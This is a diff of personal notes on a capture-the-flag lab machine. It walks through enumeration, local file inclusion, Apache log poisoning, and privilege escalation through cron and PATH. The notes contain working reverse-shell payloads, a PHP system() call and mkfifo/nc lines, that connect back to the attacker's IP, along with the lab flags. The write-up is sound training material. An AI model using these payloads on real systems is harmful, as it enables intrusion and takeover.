@@ -45,7 +45,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 39.18 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A 10.10.175.186
 
-
 ┌──(kali㉿kali)-[~]
 └─$ feroxbuster --url http://10.10.175.186 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
 
@@ -128,23 +127,15 @@ http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/
 
 </html>
 
-
-
 ```
 
-
 Enumerate the machine
-
 
 Find a different hostname
 *mafialive.thm*
 
-![[Pasted image 20220925105914.png]]
-
 Find flag 1
 *thm{f0und_th3_r1ght_h0st_n4m3} *
-
-
 
 Look for a page under development
 FUZZ!!
@@ -166,9 +157,7 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.
 
 10.18.1.77 - - [25/Sep/2022:21:18:45 +0530] "GET / HTTP/1.0" 200 19462 "-" "-" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "GET / HTTP/1.1" 200 3888 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "GET / HTTP/1.0" 200 19462 "-" "-" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "GET /nmaplowercheck1664120943 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:03 +0530] "POST / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /robots.txt HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/styles/layout.css HTTP/1.1" 200 4953 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "POST /sdk HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /.git/HEAD HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /images/demo/348x261.png HTTP/1.1" 200 3162 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /evox/about HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/scripts/jquery.backtotop.js HTTP/1.1" 200 693 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/scripts/jquery.mobilemenu.js HTTP/1.1" 200 926 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/styles/fontawesome-free/css/fontawesome-all.min.css HTTP/1.1" 200 8451 "http://10.10.175.186/layout/styles/layout.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "PROPFIND / HTTP/1.1" 405 523 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /layout/scripts/jquery.min.js HTTP/1.1" 200 30663 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:04 +0530] "GET /HNAP1 HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/styles/framework.css HTTP/1.1" 200 2178 "http://10.10.175.186/layout/styles/layout.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /images/demo/100x100.png HTTP/1.1" 200 1543 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "PPRL / HTTP/1.1" 501 499 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /images/demo/348x420.png HTTP/1.1" 200 3799 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET / HTTP/1.1" 200 19462 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /images/demo/backgrounds/01.png HTTP/1.1" 200 21142 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/scripts/jquery.backtotop.js HTTP/1.1" 200 693 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/styles/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 44266 "http://10.10.175.186/layout/styles/fontawesome-free/css/fontawesome-all.min.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/styles/fontawesome-free/webfonts/fa-brands-400.woff2 HTTP/1.1" 200 54946 "http://10.10.175.186/layout/styles/fontawesome-free/css/fontawesome-all.min.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /favicon.ico HTTP/1.1" 404 491 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:06 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/scripts/jquery.mobilemenu.js HTTP/1.1" 200 926 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:05 +0530] "GET /layout/scripts/jquery.min.js HTTP/1.1" 200 30663 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:06 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:07 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:07 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" ::1 - - [25/Sep/2022:21:19:07 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" 10.18.1.77 - - [25/Sep/2022:21:19:08 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:08 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" 10.18.1.77 - - [25/Sep/2022:21:19:09 +0530] "OPTIONS / HTTP/1.1" 200 181 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" ::1 - - [25/Sep/2022:21:19:10 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:11 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:12 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" 10.18.1.77 - - [25/Sep/2022:21:19:12 +0530] "GET / HTTP/1.0" 200 19462 "-" "-" 10.18.1.77 - - [25/Sep/2022:21:19:13 +0530] "GET / HTTP/1.1" 200 19443 "-" "-" ::1 - - [25/Sep/2022:21:19:13 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:14 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:15 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:16 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:17 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" ::1 - - [25/Sep/2022:21:19:18 +0530] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) (internal dummy connection)" 10.18.1.77 - - [25/Sep/2022:21:19:30 +0530] "POST / HTTP/1.1" 200 3888 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:19:35 +0530] "POST / HTTP/1.1" 200 3887 "http://10.10.175.186/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:21:22:02 +0530] "GET / HTTP/1.1" 200 19443 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:03 +0530] "GET /e12107a0a4e0402f87e25cd1443ab901 HTTP/1.1" 404 436 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:03 +0530] "GET / HTTP/1.1" 200 19443 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:04 +0530] "GET /.bash_history HTTP/1.1" 404 436 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:04 +0530] "GET /.cache HTTP/1.1" 404 436 "-" "feroxbuster/2.7.0" 10.18.1.77 - - [25/Sep/2022:21:22:04 +0530] "GET / HTTP/1.1" 
 
-
 We’ll now poison the apache2 log file by injecting a PHP payload in the user-agent string as follows: 
-
 
 some problem ocurred internal 500 server loading a new machine
 
@@ -192,11 +181,9 @@ some problem ocurred internal 500 server loading a new machine
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 
-
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log
 
 10.18.1.77 - - [25/Sep/2022:22:20:30 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 10.18.1.77 - - [25/Sep/2022:22:20:32 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" 
-
 
 revshell
 
@@ -205,7 +192,6 @@ revshell
 <?php
         system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.18.1.77 4444 >/tmp/f");
 ?>
-
 
 ┌──(kali㉿kali)-[~]
 └─$ python3 -m http.server 
@@ -266,7 +252,6 @@ www-data@ubuntu:/home/archangel$ cat user.txt
 cat user.txt
 thm{lf1_t0_rc3_1s_tr1cky}
 
-
 www-data@ubuntu:/home/archangel$ cat /etc/crontab
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -290,7 +275,6 @@ cat /opt/helloworld.sh
 #!/bin/bash
 echo "hello world" >> /opt/backupfiles/helloworld.txt
 
-
 www-data@ubuntu:/home/archangel$ cd /opt
 cd /opt
 www-data@ubuntu:/opt$ ls -la
@@ -305,7 +289,6 @@ replacing the file with a payload
 
 www-data@ubuntu:/opt$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.1.77 1337 >/tmp/f' >> /opt/helloworld.sh
 <1|nc 10.18.1.77 1337 >/tmp/f' >> /opt/helloworld.sh
-
 
 horizontal priv esc
 
@@ -341,7 +324,6 @@ drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 secret
 -rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
 -rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
 
-
 archangel@ubuntu:~$ cd secret
                     cd secret
 cd secret
@@ -358,14 +340,6 @@ archangel@ubuntu:~/secret$ cat user2.txt
 cat user2.txt
 thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
 
-
-
-
-
-
-
-
-
 another method lfi
 
 http://mafialive.thm/test.php?view=php://filter//var/www/html/development_testing/resource=/etc/passwd
@@ -378,7 +352,6 @@ thm{lf1_t0_rc3_1s_tr1cky}
 
 https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
 log poisoning
-
 
 priv esc
 
@@ -509,7 +482,6 @@ echo $PATH
 
 Creamos un script para que ejecute bash con el nombre cp y le damos permisos de ejecucion, tambien agregamos al inicio la direccion /home/archangel/secret a la variable PATH.
 
-
 archangel@ubuntu:~/secret$ echo "/bin/bash" > cp
                            echo "/bin/bash" > cp
 echo "/bin/bash" > cp
@@ -532,12 +504,7 @@ root@ubuntu:~/secret# cat /root/root.txt
 cat /root/root.txt
 thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
 
-
-
 ```
-
-![[Pasted image 20220925114518.png]]
-
 
 Get a shell and find the user flag
 Poison!!!
@@ -547,8 +514,6 @@ Do privilege escalation
 
 Get User 2 flag 
 *thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}*
-
-
 
 Root the machine and find the root flag
 certain paths are dangerous 
